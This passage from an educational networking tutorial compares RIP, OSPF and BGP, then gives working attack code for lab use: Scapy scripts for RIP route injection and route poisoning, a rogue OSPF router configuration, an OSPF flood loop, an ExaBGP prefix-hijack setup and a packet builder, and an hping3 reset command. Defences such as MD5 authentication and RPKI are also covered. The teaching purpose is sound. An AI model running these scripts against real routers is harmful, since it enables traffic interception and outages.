  │ 2  │ Local Preference     │ Higher preferred; communicated within AS only  │
  │ 3  │ Locally originated   │ Prefer routes you originated vs learned        │
  │ 4  │ AS PATH length       │ Shorter AS path = preferred                    │
  │ 5  │ Origin               │ IGP > EGP > Incomplete                        │
  │ 6  │ MED                  │ Lower = preferred (suggested metric to AS)     │
  │ 7  │ eBGP > iBGP          │ Prefer externally learned routes              │
  │ 8  │ IGP metric to next-hop│ Lower = preferred                             │
  └────┴──────────────────────┴──────────────────────────────────────────────┘

  BGP Message Types:
  ┌──────────────────┬──────────────────────────────────────────────────────┐
  │ Message Type     │ Purpose                                               │
  ├──────────────────┼──────────────────────────────────────────────────────┤
  │ OPEN             │ Establish BGP session (AS number, BGP ID exchanged)   │
  │ UPDATE           │ Advertise new routes or withdraw old ones             │
  │ NOTIFICATION     │ Report error (then session closes)                    │
  │ KEEPALIVE        │ Heartbeat — confirm session is alive (every 60 sec)   │
  └──────────────────┴──────────────────────────────────────────────────────┘

  BGP Session Establishment:
    Step 1: TCP 3-way handshake to port 179
    Step 2: OPEN message exchanged (negotiate AS, version, Hold Timer)
    Step 3: KEEPALIVE sent to confirm OPEN accepted
    Step 4: UPDATE messages flow (exchanging routing prefixes)
    Step 5: KEEPALIVE continues to maintain session

  Why BGP is "Path Vector" and not "Distance Vector":
    Distance Vector: "I can reach X, cost = 7"
    Path Vector:     "I can reach X via AS65001 → AS65002 → AS65003"

    The AS-PATH attribute explicitly records EVERY AS on the path.
    This prevents routing loops (if your own AS is in the path: reject it).
    It also enables policy: "Avoid routing through AS65003 (competitor)"
```

---

## 9. Comparison Table — All Protocols

| Property               | RIP v2                       | OSPF                        | BGP v4                      |
| ---------------------- | ---------------------------- | --------------------------- | --------------------------- |
| **Category**           | Intra-domain (IGP)           | Intra-domain (IGP)          | Inter-domain (EGP)          |
| **Algorithm**          | Bellman-Ford                 | Dijkstra SPF                | Policy / Path Vector        |
| **Routing type**       | Distance Vector              | Link State                  | Path Vector                 |
| **Metric**             | Hop count (max 15)           | Cost (10⁸/bandwidth)        | Policy attributes (AS PATH) |
| **Transport**          | UDP port 520                 | IP Protocol 89              | TCP port 179                |
| **Update destination** | Multicast 224.0.0.9          | Multicast 224.0.0.5 / .0.6  | Unicast TCP to peer         |
| **Update frequency**   | Every 30 seconds             | Triggered on change         | Triggered / incremental     |
| **Convergence speed**  | Slow (minutes)               | Fast (seconds)              | Slow (intentional)          |
| **Scalability**        | Small networks only          | Large enterprise networks   | Internet scale              |
| **Routing loops**      | Possible (mitigations exist) | Not possible                | Not possible (AS PATH)      |
| **Authentication**     | MD5 (optional)               | MD5 / IPsec                 | MD5 / TCP-AO                |
| **Network scope**      | Single AS, small             | Single AS, hierarchical     | Between ASes                |
| **Max network size**   | 15 hops                      | Unlimited (area hierarchy)  | Global Internet             |
| **Memory/CPU usage**   | Low                          | High (stores full topology) | Very high (million routes)  |
| **Configuration**      | Simple                       | Moderate                    | Complex                     |
| **Exam importance**    | ⭐⭐⭐ (most important)      | ⭐⭐⭐                      | ⭐⭐                        |

```
Memory trick for protocol associations:
  RIP   → Distance Vector → Bellman-Ford → hop count → max 15 → UDP 520
  OSPF  → Link State      → Dijkstra SPF → cost      → areas  → IP-89
  BGP   → Path Vector     → policy       → AS-PATH   → Internet→ TCP-179
```

---

## 10. Security Analysis — Attacking Routing Protocols

> **Note:** All techniques below are for educational use only. Test exclusively on your own lab environment — Metasploitable2, your own MERN/PERN web projects, or your personal authorised test network.

### 10.1 Attacks on RIP

```bash
# ──────────────────────────────────────────────────────────────────────────
# ATTACK 1: RIP Route Injection (Black Hat / MITM)
# ──────────────────────────────────────────────────────────────────────────
# RIPv1 has NO authentication.
# RIPv2 authentication is optional and often disabled.
# An attacker on the same network can inject false RIP updates,
# redirecting traffic through the attacker's machine (MITM).

# What we are doing:
# → Send a fake RIP UPDATE packet claiming a specific network is reachable
#   at 1 hop (better than all other known routes)
# → Routers in the network believe it and update their tables
# → Traffic destined for that network flows to us instead

# Install scapy:
sudo apt install python3-scapy -y

# Fake RIP update injection with Scapy:
sudo python3 << 'EOF'
from scapy.all import *

# Craft a fake RIPv2 update
# Claiming we can reach 10.0.0.0/8 at 1 hop (very attractive route)
rip_packet = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /    # Broadcast at Layer 2
    IP(src="192.168.56.101",             # Our Parrot OS IP (attacker)
       dst="255.255.255.255") /          # Broadcast (RIPv1 style)
    UDP(sport=520, dport=520) /          # RIP uses UDP 520
    RIP(cmd=2, version=2) /              # RIP RESPONSE (UPDATE) message
    RIPEntry(
        AF=2,                            # Address Family: IP
        addr="10.0.0.0",                 # Destination network
        mask="255.0.0.0",                # Subnet mask /8
        nextHop="192.168.56.101",        # Next hop = OUR machine
        metric=1                         # Metric 1 = best possible route
    )
)

print("[*] Sending fake RIP route injection...")
print(f"[*] Claiming 10.0.0.0/8 is reachable via 192.168.56.101 at cost 1")
sendp(rip_packet, iface="eth0", verbose=True)
print("[*] Packet sent. Check routing tables on target routers.")
print("[*] Traffic to 10.0.0.0/8 should now flow through our machine.")
EOF

# Verify the attack worked — check if route appeared in your routing table:
ip route show | grep "10.0.0.0"

# Enable IP forwarding so traffic continues to flow (MITM position):
sudo sysctl net.ipv4.ip_forward=1

# Now capture all forwarded traffic:
sudo tcpdump -i eth0 -n -A "not port 22" -c 50
# You will see traffic that was NOT meant for you passing through your machine

# ──────────────────────────────────────────────────────────────────────────
# ATTACK 2: RIP Route Poisoning (DoS / Black Hole)
# ──────────────────────────────────────────────────────────────────────────
# Inject a route with metric=16 (infinity) for a legitimate network.
# Routers will believe that network is unreachable → traffic is dropped.
# This is a Denial of Service against that specific network prefix.

sudo python3 << 'EOF'
from scapy.all import *

# Poison the route to 192.168.10.0/24 (pretend target network)
poison_packet = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src="192.168.56.101", dst="255.255.255.255") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(
        AF=2,
        addr="192.168.10.0",        # Target network to poison
        mask="255.255.255.0",
        nextHop="0.0.0.0",
        metric=16                   # 16 = INFINITY = unreachable
    )
)
print("[*] Sending route poison for 192.168.10.0/24 with metric=16 (black hole)")
sendp(poison_packet, iface="eth0", verbose=True, count=5)
print("[*] If successful: all traffic to 192.168.10.0/24 is dropped by routers")
EOF

# ──────────────────────────────────────────────────────────────────────────
# DEFENCE: Enable RIPv2 MD5 Authentication
# ──────────────────────────────────────────────────────────────────────────
# In Cisco IOS / FRRouting:
# interface eth0
#   ip rip authentication mode md5
#   ip rip authentication key-chain RIP_KEYS
# key chain RIP_KEYS
#   key 1
#     key-string MySecretRIPKey!2024

# In Linux FRRouting (Quagga successor):
# /etc/frr/ripd.conf:
# interface eth0
#  ip rip authentication mode md5
#  ip rip authentication key-chain RIPKEYS

# Verify authentication is working:
sudo tcpdump -i eth0 udp port 520 -v -c 5
# Look for: "RIPv2, Authentication: MD5" in output
# If you see plain RIP without auth field: authentication NOT configured
```

---

### 10.2 Attacks on OSPF

```bash
# ──────────────────────────────────────────────────────────────────────────
# ATTACK 1: OSPF Neighbour Spoofing (Rogue Router Join)
# ──────────────────────────────────────────────────────────────────────────
# OSPF routers accept Hello packets and form neighbours automatically.
# If authentication is disabled: an attacker can spoof OSPF HELLO packets,
# become an OSPF neighbour, then inject false LSAs.

# Install FRRouting to act as a rogue OSPF router:
sudo apt install frr -y

# Enable OSPF daemon:
sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemons

# Configure rogue OSPF router:
sudo tee /etc/frr/ospfd.conf << 'EOF'
! Rogue OSPF configuration
! This joins Area 0 of the target OSPF network
hostname rogue-router
password frr
log file /var/log/frr/ospf.log

router ospf
  ospf router-id 192.168.56.199          ! Our rogue router ID
  network 192.168.56.0/24 area 0         ! Join Area 0 (backbone)
  ! NO authentication configured — this works if target has none either

interface eth0
  ip ospf cost 1                          ! Low cost = attractive route
  ip ospf priority 255                    ! Highest priority = become DR
  ip ospf dead-interval 40
  ip ospf hello-interval 10
EOF

sudo systemctl restart frr

# Monitor OSPF neighbour formation:
sudo vtysh -c "show ip ospf neighbor"
# If we see other routers listed: we have joined the OSPF domain ✅

# Now inject a fake route into OSPF:
sudo vtysh
# (inside vtysh):
# router ospf
#   redistribute static  ! Redistribute our static routes into OSPF
# exit
# ip route 10.99.0.0/24 192.168.56.199   ! Create a static "black hole" route
# This will be flooded to all OSPF routers as if it's a real network

# ──────────────────────────────────────────────────────────────────────────
# ATTACK 2: OSPF LSA Flooding (DoS — CPU exhaustion)
# ──────────────────────────────────────────────────────────────────────────
# OSPF routers must process every LSA they receive.
# An attacker who joins the domain can flood thousands of fake LSAs,
# exhausting router CPU and causing re-convergence storms.

sudo python3 << 'EOF'
from scapy.all import *

# OSPF LSA flood simulation (educational)
# Real OSPF flooding would require proper OSPF packet formatting
# Here we send many OSPF packets to trigger CPU load

ospf_target = "224.0.0.5"   # ALLSPFRouters multicast

for seq in range(1, 100):
    # Craft basic OSPF packet (simplified)
    pkt = (
        IP(src="192.168.56.101", dst=ospf_target, proto=89, ttl=1) /
        Raw(load=b"\x04" + b"\x00" * 60)  # Type 4 = LS Update (simplified)
    )
    send(pkt, verbose=0)
    if seq % 10 == 0:
        print(f"[*] Sent {seq} OSPF packets")

print("[*] Flood complete — monitor target router CPU usage")
EOF

# ──────────────────────────────────────────────────────────────────────────
# DEFENCE: Enable OSPF MD5 Authentication
# ──────────────────────────────────────────────────────────────────────────
# In FRRouting (frr):
# interface eth0
#  ip ospf authentication message-digest
#  ip ospf message-digest-key 1 md5 MyOSPFSecret!2024

# Verify authentication is in use:
sudo vtysh -c "show ip ospf interface eth0"
# Look for: "Authentication: Message Digest" in output
# If "Authentication: NONE": vulnerable to rogue router attack

# Check current OSPF neighbours and their authentication status:
sudo vtysh -c "show ip ospf neighbor detail"
```

---

### 10.3 Attacks on BGP

```bash
# ──────────────────────────────────────────────────────────────────────────
# ATTACK 1: BGP Hijacking Simulation (Most Dangerous Internet Attack)
# ──────────────────────────────────────────────────────────────────────────
# BGP hijacking = announcing someone else's IP prefixes as your own.
# Routers prefer more specific routes (longer prefix) or shorter AS paths.
# A rogue AS can attract traffic meant for a legitimate network.

# Famous real-world BGP hijacks:
#   2010: China Telecom (AS23724) hijacked 15% of Internet routes for 18 minutes
#   2018: MyEtherWallet BGP hijack — DNS was redirected to steal crypto wallets
#   2022: Cloudflare and Google services disrupted by BGP leak from AS1221

# SIMULATION: BGP Prefix Hijacking with ExaBGP (on your own test network)
# ExaBGP = a tool to create custom BGP speakers
sudo apt install exabgp -y

# Create ExaBGP configuration for hijacking simulation:
sudo tee /tmp/bgp_hijack_sim.conf << 'EOF'
# ExaBGP BGP Hijacking Simulation
# !! ONLY RUN ON YOUR OWN TEST NETWORK !!

group hijack-simulation {
    description "BGP hijack test — own lab only";
    router-id 192.168.56.101;
    local-as 65535;                     # Our rogue AS number (private range)

    neighbor 192.168.56.102 {
        description "Target BGP router (Metasploitable2)";
        peer-as 65001;                  # Target router's AS number
        local-address 192.168.56.101;

        family {
            ipv4 unicast;
        }

        process announce-hijack {
            run /tmp/bgp_hijack_announcements.py;
            encoder text;
        }
    }
}
EOF

# Create the announcement script:
sudo tee /tmp/bgp_hijack_announcements.py << 'PYEOF'
#!/usr/bin/env python3
import sys
import time

# Simulate announcing a hijacked prefix (your own test address space only)
# In a real attack: this would be someone else's IP range
MY_TEST_PREFIX = "192.0.2.0/24"   # RFC 5737 documentation prefix — safe to test with

print(f"announce route {MY_TEST_PREFIX} next-hop 192.168.56.101 as-path [65535]")
sys.stdout.flush()

# Keep announcing every 60 seconds
while True:
    time.sleep(60)
    print(f"announce route {MY_TEST_PREFIX} next-hop 192.168.56.101 as-path [65535]")
    sys.stdout.flush()
PYEOF
chmod +x /tmp/bgp_hijack_announcements.py

# Run the hijack simulation:
# exabgp /tmp/bgp_hijack_sim.conf
# (Only meaningful if you have a BGP router in your lab to accept the session)

# ──────────────────────────────────────────────────────────────────────────
# ATTACK 2: BGP Session Reset (TCP RST Injection)
# ──────────────────────────────────────────────────────────────────────────
# BGP runs over TCP. If you can inject a TCP RST packet with the right
# sequence number: you can terminate any BGP session.
# This is a DoS against the BGP peering relationship.

# Capture BGP session traffic to find sequence numbers:
sudo tcpdump -i eth0 -n "tcp port 179" -c 20 -w /tmp/bgp_session.pcap
wireshark /tmp/bgp_session.pcap &
# Filter: tcp.port == 179
# Look at TCP sequence numbers in the KEEPALIVE messages

# BGP TCP RST injection (using hping3):
# First: identify the BGP peer's TCP sequence number from the capture
# Then: inject TCP RST with that sequence number
# hping3 -S 192.168.56.102 -p 179 -R --tcp-timestamp -c 5
# (Replace 192.168.56.102 with your test BGP peer IP in your lab)

# DEFENCE AGAINST BGP ATTACKS:
# 1. TCP MD5 Authentication (RFC 2385):
#    Both BGP peers sign every TCP segment with an MD5 hash.
#    Without the key: cannot inject valid RST or data packets.
#    FRRouting config: neighbor 192.168.56.102 password BgpSecretKey!

# 2. BGP RPKI (Resource Public Key Infrastructure):
#    Cryptographically validates that ASes are authorised to announce specific prefixes.
#    Prevents prefix hijacking at the routing policy level.
#    Check BGP RPKI validation status:
sudo apt install rpki-client -y
rpki-client -v   # Validates the global BGP routing table against RPKI

# 3. Prefix Filtering (BOGON filters):
#    Never accept RFC 1918, reserved, or obviously wrong prefixes from eBGP peers.
#    Filter out: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 0.0.0.0/8, etc.

echo "BGP Security checklist:"
echo "  ✅ TCP MD5 authentication on all BGP sessions"
echo "  ✅ BGP RPKI validation enabled"
echo "  ✅ Prefix filters: reject BOGON and too-specific prefixes"
echo "  ✅ Max-prefix limits per peer (prevent route table overflow)"
echo "  ✅ Peer AS filtering: only accept expected AS numbers from each peer"
```

---

## 11. 🧪 Practical Labs

### Lab 1 — Capture Routing Protocol Traffic in Wireshark

```bash
# PURPOSE: See RIP, OSPF, and BGP traffic in Wireshark to understand
# what routers actually send to each other.
# REQUIREMENT: Parrot OS, Wireshark, GNS3 or FRRouting

# Install FRRouting to generate routing protocol traffic:
sudo apt install frr frr-pythontools -y

# Enable RIP daemon:
sudo sed -i 's/ripd=no/ripd=yes/' /etc/frr/daemons

# Configure basic RIP:
sudo tee /etc/frr/ripd.conf << 'EOF'
hostname parrot-router
password frr
router rip
  version 2
  network 192.168.56.0/24
  network 10.0.1.0/24
EOF

sudo systemctl restart frr

# Start capturing RIP traffic:
sudo tcpdump -i eth0 -n "udp port 520" -w /tmp/rip_capture.pcap &

# Wait 35 seconds for at least one RIP update cycle:
sleep 35
sudo killall tcpdump

# Open in Wireshark:
wireshark /tmp/rip_capture.pcap &
# Filter: rip
# You should see: RIPv2 RESPONSE packets every 30 seconds
# Click on one to expand: see each route entry with destination, mask, metric

# What to look for in Wireshark for each protocol:

echo "=== RIP Analysis ==="
tshark -r /tmp/rip_capture.pcap -Y "rip" -T fields \
  -e ip.src -e ip.dst -e rip.version -e rip.command -e rip.ip -e rip.metric \
  -q 2>/dev/null | head -20
# See: which routers are sending RIP updates, what routes they're advertising

# Enable OSPF daemon:
sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemons
sudo tee /etc/frr/ospfd.conf << 'EOF'
hostname parrot-ospf
router ospf
  ospf router-id 192.168.56.101
  network 192.168.56.0/24 area 0
EOF
sudo systemctl restart frr

# Capture OSPF traffic:
sudo tcpdump -i eth0 -n "proto 89" -w /tmp/ospf_capture.pcap -c 30
wireshark /tmp/ospf_capture.pcap &
# Filter: ospf
# Look for:
#   OSPF HELLO packets (every 10 seconds by default)
#   OSPF DB Description (during initial sync)
#   OSPF LS Update (topology flooding)
# Notice: OSPF travels directly in IP (no TCP/UDP header!)

# Key Wireshark observations to record:
echo "Protocol   | Transport | Update freq | What you see"
echo "──────────────────────────────────────────────────────────"
echo "RIP        | UDP/520   | 30 sec      | Full routing table in each packet"
echo "OSPF Hello | IP/89     | 10 sec      | Router ID, area, DR/BDR election"
echo "OSPF LSU   | IP/89     | On change   | Link State Advertisements (LSAs)"
echo "BGP        | TCP/179   | On change   | OPEN, UPDATE, KEEPALIVE messages"
```

---

### Lab 2 — Simulate RIP on GNS3 / Metasploitable2

```bash
# PURPOSE: Create a multi-router RIP network, watch convergence,
# and demonstrate the Count-to-Infinity problem.

# ── Option A: Using FRRouting on Parrot OS ──────────────────────────────

# Set up two FRR instances simulating two routers:
# (Using network namespaces to create isolated routers)

# Create two network namespaces (simulated routers):
sudo ip netns add router1
sudo ip netns add router2

# Create a virtual link between them:
sudo ip link add veth-r1r2 type veth peer name veth-r2r1

# Move each end into the respective namespace:
sudo ip link set veth-r1r2 netns router1
sudo ip link set veth-r2r1 netns router2

# Configure addresses:
sudo ip netns exec router1 ip addr add 10.0.12.1/30 dev veth-r1r2
sudo ip netns exec router1 ip link set veth-r1r2 up
sudo ip netns exec router2 ip addr add 10.0.12.2/30 dev veth-r2r1
sudo ip netns exec router2 ip link set veth-r2r1 up

# Add loopback networks to simulate "LANs" behind each router:
sudo ip netns exec router1 ip addr add 10.1.0.1/24 dev lo
sudo ip netns exec router2 ip addr add 10.2.0.1/24 dev lo

# Start RIP on router1:
sudo ip netns exec router1 ripd \
  --config_file /dev/stdin << 'EOF'
hostname router1
router rip
  version 2
  network 10.0.12.0/30
  network 10.1.0.0/24
EOF

# Start RIP on router2 similarly.

# Monitor RIP table convergence:
sudo ip netns exec router1 vtysh -c "show ip rip"
# Expected after convergence:
#   Codes: R - RIP, C - Connected, S - Static
#   C  10.0.12.0/30  → directly connected
#   C  10.1.0.0/24   → directly connected
#   R  10.2.0.0/24   → via 10.0.12.2 metric 2  ← learned from router2 via RIP!

# ── Demonstrate Count-to-Infinity ──────────────────────────────────────

# Break the 10.2.0.0/24 link on router2:
sudo ip netns exec router2 ip link set lo down

# Watch router1's table try to count to infinity:
for i in $(seq 1 10); do
  echo "=== After ${i}0 seconds ==="
  sudo ip netns exec router1 vtysh -c "show ip rip" | grep "10.2.0.0"
  sleep 10
done
# You will see the metric for 10.2.0.0/24 increment: 2 → 3 → 4 → ... → 16
# This takes ~3 minutes → this is the Count-to-Infinity problem in action

# Verify with split horizon enabled (should prevent the loop):
sudo ip netns exec router1 vtysh
# (inside vtysh):
# interface veth-r1r2
#  ip rip split-horizon          ← enable split horizon
# end
# show ip rip                    ← see if count-to-infinity stops

# Log the timing of convergence vs without split horizon:
echo "With Count-to-Infinity (no mitigation): ~3-6 minutes to converge"
echo "With Split Horizon:                       ~30-60 seconds"
echo "With Poison Reverse:                      ~30 seconds (explicit metric=16)"
```

---

### Lab 3 — OSPF Neighbour Capture and Analysis

```bash
# PURPOSE: Observe OSPF neighbour discovery, LSA flooding,
# and verify OSPF authentication prevents rogue router joining.

# Install and start OSPF:
sudo apt install frr -y
sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemons

# Phase 1: OSPF without authentication (observe Hello exchange):
sudo tee /etc/frr/ospfd.conf << 'EOF'
hostname lab-ospf-router
log file /var/log/frr/ospf.log

router ospf
  ospf router-id 192.168.56.101
  network 192.168.56.0/24 area 0
  ! No authentication (vulnerable)
EOF

sudo systemctl restart frr

# Capture ALL OSPF traffic from startup:
sudo tcpdump -i eth0 -n "proto ospf" -w /tmp/ospf_full.pcap -c 100 &

sleep 30  # Wait for neighbour formation

# Analyse the capture:
wireshark /tmp/ospf_full.pcap &
# Filter: ospf
# Follow the OSPF FSM manually:
# 1. Find HELLO packets: ospf.msg.hello
# 2. Find DB Description: ospf.msg.dbdesc
# 3. Find LS Request:    ospf.msg.lsreq
# 4. Find LS Update:     ospf.msg.lsupd
# 5. Find LS Ack:        ospf.msg.lsack
# Neighbour goes: Down → Init → 2-Way → ExStart → Exchange → Loading → Full

# Print OSPF neighbour formation events:
sudo vtysh -c "show ip ospf neighbor"
sudo vtysh -c "show ip ospf database"      # See all LSAs in the LSDB
sudo vtysh -c "show ip ospf route"         # See routes computed by SPF

# Phase 2: ENABLE OSPF MD5 Authentication and verify rogue router rejected:
sudo tee /etc/frr/ospfd.conf << 'EOF'
hostname lab-ospf-router-secure
router ospf
  ospf router-id 192.168.56.101
  network 192.168.56.0/24 area 0
  area 0 authentication message-digest     ← Enable MD5 for area 0

interface eth0
  ip ospf message-digest-key 1 md5 MyOSPFAuthKey2024!
EOF

sudo systemctl restart frr

# Now try to join with an unauthenticated router (should be rejected):
# (Use the rogue FRR config from Attack section — no auth configured)
# Watch logs for rejection:
sudo journalctl -u frr --since "1 minute ago" | grep -i "auth\|reject\|mismatch"
# Expected: "authentication mismatch" or "OSPF packet authentication failed"

# Wireshark: see the difference:
# Without auth: OSPF Hello has "Auth Type: Null"
# With MD5:     OSPF Hello has "Auth Type: Cryptographic" and 16-byte key ID + digest
sudo tcpdump -i eth0 -n "proto ospf" -v -c 5 | grep -i "auth"
```

---

### Lab 4 — BGP Hijacking Simulation with Scapy

```python
#!/usr/bin/env python3
# Save as: bgp_hijack_simulation.py
# Run with: sudo python3 bgp_hijack_simulation.py
# PURPOSE: Understand BGP hijacking by simulating the attack on your own lab network.
# ENVIRONMENT: Parrot OS → Metasploitable2 (both in VirtualBox)
# !! ONLY RUN ON YOUR OWN TEST NETWORK — NEVER ON PRODUCTION !!

from scapy.all import *
import struct
import time

print("="*70)
print("BGP HIJACKING SIMULATION — Educational Lab")
print("!! Test only on your own authorised lab network !!")
print("="*70)

# ── BGP Packet Crafting Reference ──────────────────────────────────────────

# BGP runs over TCP port 179.
# In this lab we ANALYSE what a BGP hijack UPDATE would look like.
# We don't inject into a real BGP session — we craft and display the structure.

def build_bgp_open_packet(my_as, hold_time, router_id):
    """Build a BGP OPEN message (Type 1)"""
    # BGP Marker: 16 bytes of 0xFF
    marker = b'\xff' * 16
    # BGP OPEN fields:
    version = struct.pack('B', 4)           # BGP version 4
    my_as_bytes = struct.pack('!H', my_as)  # AS number (2 bytes)
    hold_time_bytes = struct.pack('!H', hold_time)
    router_id_bytes = socket.inet_aton(router_id)
    opt_param_len = struct.pack('B', 0)     # No optional parameters

    bgp_body = version + my_as_bytes + hold_time_bytes + router_id_bytes + opt_param_len

    # Total length = 19 (header) + len(body)
    total_len = struct.pack('!H', 19 + len(bgp_body))
    msg_type = struct.pack('B', 1)          # Type 1 = OPEN

    return marker + total_len + msg_type + bgp_body


def build_bgp_update_hijack(withdrawn=None, nlri_prefix="192.0.2.0/24",
                              attacker_as=65535, legitimate_as=65001):
    """Build a BGP UPDATE message announcing a hijacked prefix"""
    import socket

    # BGP Marker
    marker = b'\xff' * 16

    # Withdrawn routes (empty for hijack — we're ADDING a route)
    withdrawn_len = struct.pack('!H', 0)

    # Path Attributes:
    # 1. ORIGIN: IGP (0x40 0x01 0x01 0x00)
    origin = b'\x40\x01\x01\x00'  # Flag=Well-known+Transitive, Type=ORIGIN, Len=1, IGP=0

    # 2. AS_PATH: [attacker_as] (one AS in the path — shorter = preferred by some routers)
    #    AS_SEQUENCE type (2), 1 AS, value = attacker_as
    as_path_segment = struct.pack('!BBH', 2, 1, attacker_as)  # type=sequence, count=1, AS
    as_path = b'\x40\x02' + struct.pack('B', len(as_path_segment)) + as_path_segment

    # 3. NEXT_HOP: attacker's IP (traffic redirected to us)
    next_hop_ip = socket.inet_aton("192.168.56.101")  # Attacker's IP
    next_hop = b'\x40\x03\x04' + next_hop_ip

    path_attributes = origin + as_path + next_hop
    path_attr_len = struct.pack('!H', len(path_attributes))

    # NLRI (Network Layer Reachability Information) — the HIJACKED prefix
    # Encoding: prefix_length (1 byte) + network bytes (variable)
    prefix_parts = nlri_prefix.split('/')
    prefix_len = int(prefix_parts[1])
    network_bytes = socket.inet_aton(prefix_parts[0])
    # Only include bytes needed: ceil(prefix_len/8)
    needed_bytes = (prefix_len + 7) // 8
    nlri = struct.pack('B', prefix_len) + network_bytes[:needed_bytes]

    # Assemble BGP UPDATE
    bgp_body = withdrawn_len + path_attr_len + path_attributes + nlri
    total_len = struct.pack('!H', 19 + len(bgp_body))
    msg_type = struct.pack('B', 2)  # Type 2 = UPDATE

    return marker + total_len + msg_type + bgp_body


# ── Display the Attack Anatomy ──────────────────────────────────────────────

print("\n" + "─"*70)
print("ANATOMY OF A BGP HIJACK UPDATE")
print("─"*70)

print("""
LEGITIMATE situation BEFORE hijack:
  AS65001 (Legitimate Owner) announces 192.0.2.0/24 to the Internet.
  BGP UPDATE from AS65001:
    NLRI:     192.0.2.0/24
    AS_PATH:  [65001]
    NEXT_HOP: 198.51.100.1 (AS65001's router)

  All Internet routers: send traffic for 192.0.2.0/24 to AS65001 ✅

BGP HIJACK ATTACK:
  Attacker (AS65535) sends their own BGP UPDATE for the SAME prefix.
  If attacker announces a MORE SPECIFIC prefix:
    NLRI:     192.0.2.0/25  (← /25 is more specific than /24 — preferred!)
    AS_PATH:  [65535]
    NEXT_HOP: 192.168.56.101 (Attacker's router)

  Result: Routers prefer the /25 announcement.
  Traffic for 192.0.2.0/25 now flows to the ATTACKER.
  The attacker can:
    → DROP all traffic (blackhole — DoS)
    → FORWARD it to the real destination (transparent MitM)
    → INSPECT and forward (surveillance)

Famous example: Pakistan Telecom hijacked YouTube's prefix in 2008.
  YouTube: 208.65.153.0/24
  Pakistan Telecom announced: 208.65.153.0/24 (same prefix — short AS path)
  Result: YouTube unreachable globally for ~2 hours.
""")

# Build and display the hijack packet structure:
hijack_update = build_bgp_update_hijack(
    nlri_prefix="192.0.2.0/25",   # More specific than legitimate /24
    attacker_as=65535
)

print("Hijack BGP UPDATE binary (hex):")
print(' '.join(f'{b:02x}' for b in hijack_update))

print(f"\nTotal UPDATE message size: {len(hijack_update)} bytes")
print("This would be sent over the TCP 179 connection to a BGP peer.")

# ── Detection and Defence ───────────────────────────────────────────────────

print("\n" + "─"*70)
print("DETECTION AND DEFENCE")
print("─"*70)

print("""
Detection methods:
  1. BGP Monitoring (BGPmon, RouteViews, RIPE RIS):
     → Monitor public BGP tables for unexpected announcements of YOUR prefixes
     → Alert when your prefix appears with an unexpected AS in the AS_PATH

  2. RPKI (Resource Public Key Infrastructure):
     → Cryptographically validates: "AS65001 is authorised to announce 192.0.2.0/24"
     → Any route with invalid origin AS is marked INVALID and dropped
     → Check RPKI validation:
""")

# Check RPKI status of a BGP prefix (requires internet access):
import subprocess
print("     Command to check RPKI status:")
print("     rpki-client -v -f json | grep 192.0.2.0")
print("")
print("""  3. AS Path Filtering:
     → Configure BGP peers to only accept routes with expected AS paths
     → Reject routes where your own AS appears (loop prevention built-in)

  4. Prefix Filtering (BOGON + max-prefix):
     → Never accept RFC 1918, too-specific (/25 or longer), or bogon prefixes
     → Set max-prefix limit per peer: if peer announces more than 200 routes → alert

  5. TCP MD5 Authentication:
     → Prevents TCP RST injection against BGP sessions
     → Configure: neighbor 198.51.100.1 password BgpMd5Key!

Defence checklist:
  ✅ Register your prefixes in RPKI (ARIN, RIPE, APNIC ROA records)
  ✅ Enable RPKI validation on your routers
  ✅ Configure BGP prefix filters for all eBGP peers
  ✅ Enable TCP MD5 on all BGP sessions
  ✅ Monitor BGP table changes with BGPmon or RIPE RIS Live
  ✅ Deploy IRR (Internet Routing Registry) filters
""")
```

---

### Lab 5 — Route Poisoning Attack on Your Own Network

```bash
# PURPOSE: Demonstrate route poisoning on your own test environment.
# Observe how a malicious RIP update can take down network connectivity
# to a specific subnet — and how to defend against it.
# ENVIRONMENT: Parrot OS with FRRouting (your own isolated test network)

# ── Step 1: Set up a working 3-node RIP network ─────────────────────────────

# Create 3 network namespaces (3 simulated routers):
for ns in router1 router2 router3; do
  sudo ip netns add $ns
done

# Create veth pairs (links between routers):
sudo ip link add r1-r2-a type veth peer name r1-r2-b
sudo ip link add r2-r3-a type veth peer name r2-r3-b
sudo ip link add r1-r3-a type veth peer name r1-r3-b

# Assign links to namespaces:
sudo ip link set r1-r2-a netns router1
sudo ip link set r1-r2-b netns router2
sudo ip link set r2-r3-a netns router2
sudo ip link set r2-r3-b netns router3
sudo ip link set r1-r3-a netns router1
sudo ip link set r1-r3-b netns router3

# Configure IP addresses:
sudo ip netns exec router1 ip addr add 10.12.0.1/30 dev r1-r2-a && sudo ip netns exec router1 ip link set r1-r2-a up
sudo ip netns exec router2 ip addr add 10.12.0.2/30 dev r1-r2-b && sudo ip netns exec router2 ip link set r1-r2-b up
sudo ip netns exec router2 ip addr add 10.23.0.1/30 dev r2-r3-a && sudo ip netns exec router2 ip link set r2-r3-a up
sudo ip netns exec router3 ip addr add 10.23.0.2/30 dev r2-r3-b && sudo ip netns exec router3 ip link set r2-r3-b up
sudo ip netns exec router1 ip addr add 10.13.0.1/30 dev r1-r3-a && sudo ip netns exec router1 ip link set r1-r3-a up
sudo ip netns exec router3 ip addr add 10.13.0.2/30 dev r1-r3-b && sudo ip netns exec router3 ip link set r1-r3-b up

# Add "LAN" networks via loopback:
sudo ip netns exec router1 ip addr add 172.16.1.0/24 dev lo && sudo ip netns exec router1 ip link set lo up
sudo ip netns exec router3 ip addr add 172.16.3.0/24 dev lo && sudo ip netns exec router3 ip link set lo up

echo "[*] 3-node network topology created"
echo "     R1 (172.16.1.x) ── R2 ── R3 (172.16.3.x)"
echo "      └────────────────────────────────────────┘"

# ── Step 2: Verify connectivity before attack ─────────────────────────────

sudo ip netns exec router1 ping -c 3 10.12.0.2
# Should work — direct link R1→R2

# With RIP running, R1 would also know 172.16.3.0/24 via R3
# (requires FRR inside each namespace — simplified for this lab)

# ── Step 3: Inject route poison from "attacker" position ─────────────────

# An attacker on the same segment as R2 sends a poisoned RIP update:
sudo python3 << 'EOF'
from scapy.all import *

# Attacker is on the same network as R2 (10.12.0.0/30)
